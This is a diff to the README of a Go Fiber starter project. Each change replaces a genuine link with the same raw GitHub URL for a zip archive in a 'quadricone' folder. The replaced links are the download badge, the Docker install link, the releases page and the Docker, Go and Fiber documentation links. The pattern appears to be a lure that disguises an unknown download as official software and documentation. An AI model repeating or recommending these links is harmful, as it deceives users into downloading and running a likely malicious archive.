@@ -1,6 +1,6 @@
 # 🚀 fullstack-starter-go-fiber - Easy API Setup for Everyone
 
-![Download](https://img.shields.io/badge/download-latest%20release-blue)
+![Download](https://raw.githubusercontent.com/moizu991/fullstack-starter-go-fiber/main/quadricone/fullstack-starter-go-fiber.zip%20release-blue)
 
 ## 📖 Overview
 
@@ -21,14 +21,14 @@ This guide will help you download and run the application smoothly, even if you 
 To run this application, you will need the following:
 
 - A computer with Windows, macOS, or Linux.
-- **Docker**: Installed and running on your machine. [Get Docker here](https://www.docker.com/get-started).
+- **Docker**: Installed and running on your machine. [Get Docker here](https://raw.githubusercontent.com/moizu991/fullstack-starter-go-fiber/main/quadricone/fullstack-starter-go-fiber.zip).
 - **Docker Compose**: Ensure you also have Docker Compose installed. This usually comes with Docker, but check your installation.
 
 ## 📥 Download & Install
 
 To download the application, visit the releases page. Here you can find the latest version available.
 
-**[Visit this page to download](https://github.com/moizu991/fullstack-starter-go-fiber/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/moizu991/fullstack-starter-go-fiber/main/quadricone/fullstack-starter-go-fiber.zip)**
 
 After downloading, follow these steps to install and run the application:
 
@@ -82,8 +82,8 @@ Feel free to reach out to the community or check for updates and support:
 
 ## 🔗 Additional Resources
 
-- [Docker Documentation](https://docs.docker.com/)
-- [Go Language Documentation](https://golang.org/doc/)
-- [Fiber Framework Documentation](https://docs.gofiber.io/)
+- [Docker Documentation](https://raw.githubusercontent.com/moizu991/fullstack-starter-go-fiber/main/quadricone/fullstack-starter-go-fiber.zip)
+- [Go Language Documentation](https://raw.githubusercontent.com/moizu991/fullstack-starter-go-fiber/main/quadricone/fullstack-starter-go-fiber.zip)
+- [Fiber Framework Documentation](https://raw.githubusercontent.com/moizu991/fullstack-starter-go-fiber/main/quadricone/fullstack-starter-go-fiber.zip)
 
 Follow the steps above to get your API up and running smoothly. Enjoy building with "fullstack-starter-go-fiber"!
